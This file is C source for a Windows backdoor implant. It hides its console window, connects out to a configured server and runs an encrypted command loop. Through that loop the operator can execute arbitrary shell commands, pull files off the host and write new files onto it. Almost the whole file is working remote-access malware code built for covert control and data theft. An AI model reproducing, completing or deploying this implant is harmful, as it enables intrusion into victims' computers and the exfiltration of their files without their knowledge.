#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <sys/stat.h>

#include "common.h"
#include "implant.h"
#include "encryption/crypt.h"

int init_socket(OUT SOCKET *s)
{
    WSADATA     wsa_data;

    RtlZeroMemory(&wsa_data, sizeof(wsa_data));
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        return 0;

    *s = socket(AF_INET, SOCK_STREAM, 0);
    if (*s == INVALID_SOCKET)
        return 0;

    return 1;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    HWND                 handle;
    SOCKET               s = INVALID_SOCKET;
    struct sockaddr_in   server;
    int                  tries = 0;
    
    handle = GetConsoleWindow();
    ShowWindow(handle, SW_HIDE);

    if (!init_socket(&s))
        goto out;

    RtlZeroMemory(&server, sizeof(server));

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_port = htons(SERVER_PORT);

    while (connect(s, (struct sockaddr *)&server, sizeof(server)) != 0) {
        if (tries++ >= 5)
            goto out;
        Sleep(10*1000);
    }

    enter_cmd_loop(&s);
    
out:
    // exit routine
    if (s != INVALID_SOCKET)
        closesocket(s);
    WSACleanup();
    return 0;
}

void enter_cmd_loop(IN SOCKET *s)
{
    char            cmd[BUF_SZ];
    char            cmd_func[MAX_IMPL_CMD_FUNC_SZ];
    int             i, cmd_func_sz, cmd_idx;
    const char      *params;

    while (1) {
        RtlZeroMemory(cmd, sizeof(cmd));
        RtlZeroMemory(cmd_func, sizeof(cmd_func));
        cmd_func_sz = 0;
        cmd_idx = -1;

        params = NULL;

        recvbuf(*s, cmd);
        decrypt(cmd);
        
        params = strstr(cmd, " ");
        if (!params) // something's wrong with server, abort!
            return;

        params++; // skip white space

        cmd_func_sz = (int)(params - cmd - 1);
        strncpy(cmd_func, cmd, cmd_func_sz);

        for (i = 0; i < IMPL_MAX_CMDS; i++)
            if (strcmp(cmd_func, impl_cmd_funcs[i]) == 0) {
                cmd_idx = i;
                break;
            }

        if (cmd_idx < 0)
            continue;

        if (!impl_funcs[i](s, params))
            return;
    }
}

BOOL impl_EXIT(IN SOCKET *s, IN const char *params)
{
    return FALSE;
}

BOOL impl_EXEC(IN SOCKET *s, IN const char *params)
{
    FILE        *fp = NULL;
    char        res[BUF_SZ];

    while (*params == ' ')
        params++;

    if (*params == 0)
        return TRUE;

    RtlZeroMemory(res, sizeof(res));

    if (!strncmp(params, "cd ", 3)) {
        chdir(params + 3);
        strcpy(res, STATUS_DONE);
        sendbuf(*s, encrypt(res));
        return TRUE;
    }

    fp = _popen(params, "r");
    if (!fp)
        return TRUE;

    while (fgets(res, sizeof(res), fp) != NULL) {
        sendbuf(*s, encrypt(res));
        RtlZeroMemory(res, sizeof(res));
    }
    strcpy(res, STATUS_DONE);
    sendbuf(*s, encrypt(res));

    fclose(fp);

    return TRUE;
}

BOOL impl_GET(IN SOCKET *s, IN const char *params)
{
    FILE            *fp = NULL;
    char            res[BUF_SZ];
    char            status[BUF_SZ];
    unsigned long   nread;

    while (*params == ' ')
        params++;

    if (*params == 0)
        return TRUE;

    RtlZeroMemory(res, sizeof(res));

    fp = fopen(params, "rb");
    if (fp == NULL) {
        strcpy(status, STATUS_ERR);
        sendbuf(*s, encrypt(status));
        return TRUE;
    }

    nread = fread(res, sizeof(char), sizeof(res), fp);
    while (nread == BUF_SZ) {
        sendbuf(*s, encrypt(res));
        RtlZeroMemory(res, sizeof(res));
        nread = fread(res, sizeof(char), sizeof(res), fp);
    }

    strcpy(status, STATUS_END);
    sendbuf(*s, encrypt(status));
    nread = htonl(nread);
    send(*s, (unsigned char *)&nread, 8, 0);
    sendbuf(*s, encrypt(res));
    
    fclose(fp);

    return TRUE;
}

BOOL impl_PUT(IN SOCKET *s, IN const char *params)
{
    FILE            *fp = NULL;
    char            res[BUF_SZ];
    char            status[BUF_SZ];
    unsigned long   nwrite;

    while (*params == ' ')
        params++;

    if (*params == 0)
        return TRUE;

    RtlZeroMemory(res, sizeof(res));
    RtlZeroMemory(status, sizeof(status));

    fp = fopen(params, "wb");
    if (fp == NULL) {
        strcpy(status, STATUS_ERR);
        sendbuf(*s, encrypt(status));
        return TRUE;
    }

    // if opening file for reading is successful
    strcpy(status, STATUS_SUCCESS);
    sendbuf(*s, encrypt(status));

    recvbuf(*s, res);
    decrypt(res);

    while (strstr(res, STATUS_END) == NULL) {
        fwrite(res, sizeof(char), sizeof(res), fp);
        RtlZeroMemory(res, sizeof(res));
        recvbuf(*s, res);
        decrypt(res);
    }
    RtlZeroMemory(res, sizeof(res));

    recv(*s, (unsigned char *)&nwrite, 8, 0);
    nwrite = ntohl(nwrite);

    recvbuf(*s, res);
    decrypt(res);
    fwrite(res, sizeof(char), nwrite, fp);

    fclose(fp);

    return TRUE;
}